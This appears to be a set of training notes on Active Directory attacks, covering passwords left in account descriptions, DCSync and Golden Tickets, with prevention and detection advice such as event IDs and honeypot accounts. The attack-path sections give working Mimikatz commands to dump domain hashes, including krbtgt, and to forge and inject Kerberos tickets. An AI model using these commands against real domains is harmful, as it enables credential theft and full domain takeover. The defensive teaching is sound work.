SamAccountName : bonni
Description    : pass: Slavi123

docs.title: Prevention
docs.text:
Scan AD for sensitive keywords.

Remove passwords from object properties immediately.

Educate administrators that AD properties are readable by domain users.

Use password vaulting and documented identity management workflows.

docs.title: Detection
docs.text:
Reading AD object properties is noisy and difficult to detect directly.

Instead, monitor:

  • Logons using accounts found in suspicious descriptions
  • Service accounts logging in from unusual systems
  • Object modifications that add suspicious text to Description or Info fields

Relevant events:

Event ID Meaning 4624 Successful logon 4625 Failed logon 4738 User account changed 4768 Kerberos TGT requested

docs.title: Honeypot Idea
docs.text:
Create a fake account with a fake password in the description:

svc_hr_backup
Description: Backup Service - Pass: P@ssw0rd123!

The real password should be different and complex.

Alert on any logon attempt for the honeypot account.

docs.title: DCSync
docs.text:
DCSync allows an attacker to impersonate a Domain Controller and request password replication data from another Domain Controller.

It does not require malware execution on the DC. Instead, it abuses legitimate Active Directory replication behavior.

docs.title: Required Rights
docs.text:
An account needs replication privileges on the domain object:

Right Meaning DS-Replication-Get-Changes Replicate directory changes DS-Replication-Get-Changes-All Replicate sensitive data, including password hashes

By default, Domain Admins, Enterprise Admins, and Domain Controllers have these rights.

Some sync or service accounts may also have them.

docs.title: Attack Path
docs.text:
Dump a specific user hash with Mimikatz:

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator

Dump many domain credentials:

mimikatz # lsadump::dcsync /domain:eagle.local /all

Example output:

SAM Username : Administrator
Hash NTLM    : fcdc65703dd2b0bd789977f1f3eeaecf

docs.title: Prevention
docs.text:
Audit who has replication rights on the domain root.

Remove replication rights from accounts that do not strictly need them.

Restrict replication traffic so only known Domain Controllers can perform replication.

Use RPC filtering where possible.

docs.title: Detection
docs.text:
Monitor Event ID 4662.

Look for:

Access Mask: 0x100

And replication GUIDs:

1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

Alert when the requesting account is not:

  • A Domain Controller computer account
  • An approved directory sync account

docs.title: Golden Ticket Attack
docs.text:
A Golden Ticket is a forged Kerberos Ticket Granting Ticket created using the krbtgt account hash.

If attackers obtain the krbtgt hash, they can create Kerberos tickets for any user, with any group membership, for almost any lifetime.

docs.title: Why It Works
docs.text:
The krbtgt account signs Kerberos TGTs.

If an attacker has the krbtgt hash, they can create TGTs that the Domain Controller treats as valid.

Golden Tickets can be used to:

  • Impersonate Domain Admins
  • Create tickets for nonexistent users
  • Maintain long-term persistence
  • Access domain resources even after user password changes

docs.title: Attack Path
docs.text:
Dump the krbtgt hash:

mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt

Forge and inject a ticket:

mimikatz # kerberos::golden /domain:eagle.local /sid:<Domain_SID> /rc4:<KRBTGT_HASH> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

Verify ticket cache:

klist

Access a domain resource:

dir \\dc1\c$

docs.title: Prevention
docs.text:
Protect the krbtgt account hash as a Tier 0 secret.

Limit who can perform DCSync.

Use privileged access workstations for domain administration.

Rotate the krbtgt password twice if compromise is suspected.

The password must be changed twice because AD keeps the current and previous krbtgt secrets for ticket validation during replication.

docs.title: Detection
docs.text:
Monitor for:

  • Kerberos tickets with abnormal lifetimes
  • RC4 tickets in AES-only environments
  • Privileged tickets used from non-admin workstations
